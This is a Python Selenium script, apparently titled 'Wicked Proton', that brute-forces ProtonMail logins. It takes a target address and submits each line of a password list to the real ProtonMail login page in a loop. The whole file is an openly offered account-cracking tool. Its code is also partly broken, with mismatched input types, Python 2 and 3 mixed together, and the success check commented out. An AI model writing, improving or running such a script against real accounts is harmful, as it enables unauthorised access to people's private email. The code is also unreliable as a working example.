from selenium import webdriver
from selenium.webdriver.common.keys import Keys
#from selenium.webdriver.common.by import By
#from selenium.webdriver.support.ui import WebDriverWait
#from selenium.webdriver.support import expected_conditions as EC
#from threading import Thread, Event
import time
from colored import fg,bg,attr
colors = fg(203)
print (colors + "")
colo = input("Input value for color(0-256)\n 220 => Wicked Yellow\n 203 =>  Red\n 229 => White\n 159 => Blue etc..:")
color = fg(colo)
print (color + "	                									")
print ("												")					
print ("												" )					
print ("		\ \      / /(_)  ___ | | __ ___   __| |  |  _ \  _ __  ___  | |_  ___   _ __    ")
print ("		 \ \ /\ / / | | / __|| |/ // _ \ / _` |  | |_) || '__|/ _ \ | __|/ _ \ | '_ \   "  )
print ("		  \ V  V /  | || (__ |   <|  __/| (_| |  |  __/ | |  | (_) || |_| (_) || | | |	"  )
print ("		   \_/\_/   |_| \___||_|\_\\___| \__,_|  |_|    |_|   \___/  \__|\___/ |_| |_|   "  )
color = fg(colo)
print (color + "												")
print ("				          _        ___                                        "  )    
print ("		   	        |  |     | |      / (_)   |  o     o                           ")
print ("			        |__|__|_ | |      \__   __|    _|_     __   _  _               ")
print ("			           |  |  |/ \     /    /  |  |  |  |  /  \_/ |/ |               " )
print ("			           |  |_/|   |_/  \___/\_/|_/|_/|_/|_/\__/   |  |_/             ")
color = fg(colo)
print ("                                                                                    ")
print ("				                ____      ____   _  _    			  " )		
print ("				       __   __ |___ \    | ___| | || |   			  "  )
print ("				       \ \ / /   __) |   |___ \ | || |_  			  "  )
print ("				        \ V /   / __/  _  ___) ||__   _| 			   ")
print ("				         \_/   |_____|(_)|____/    |_|                            ") 
print ("												 ")
print ("      											")	
											

choose = input(color + "Choose the browser:\n(1) Chrome\n(2) Firefox\n(3) Opera\n")
if (choose == 1):
	browser = webdriver.Chrome();
elif (choose ==2):
	browser = webdriver.Firefox();
elif (choose == 3):
	browser = webdriver.Opera();
	

#website = raw_input("Enter Website url:")
browser.get('https://mail.protonmail.com/login')
#log = browser.find_element_by_link_text('LOG IN')
#log.click()
t = input("Choose time delay after each login(in seconds): ")
login  = browser.find_element_by_id('username')
name = raw_input("Enter mail id to brute force :")
login.send_keys(name)
password = browser.find_element_by_id('password')
#password.clear()
filesss=open("password.lst","r")
passe = filesss.readlines()
start_time = time.time()
i=1
col=25

for i in passe:
	passes = i.strip()
	col +=1
	if col == 230 :
		col = 19
	color=fg(col)
	#print passes
	password.send_keys(passes)
	#time.sleep(0.5)
	password.send_keys(Keys.ENTER)
	#loginbtn = browser.find_element_by_id('login_btn')
	#loginbtn.click()	
	time.sleep(t)

        #print (color + passes)
	#if(browser.current_url != 'https://mail.protonmail.com/login'):
		#print "Password BROKEN"
		#break
	#if(browser.current_url == 'https://mail.protonmail.com/login')
	#time.sleep(1)
	password.clear()
	#for k in passes:
	#	password.send_keys(Keys.BACK_SPACE)
	#passes = ""
	
	
	#for k in passes:
	#	password.send_keys(Keys.BACK_SPACE)
	#k=0
filesss.close()

#loginbtn = browser.find_element_by_id('login_btn')
#loginbtn.click()
#password.send_keys(Keys.ENTER)
browser.implicitly_wait(10)
print("--- Time taken %s seconds ---" % (time.time() - start_time))
time.sleep(9)
#action_thread.start()
#action_thread.join(timeout=5)
browser.close()


#browser.find_element_by_xpath('//*[@id="pm_sidebar"]/button').click()



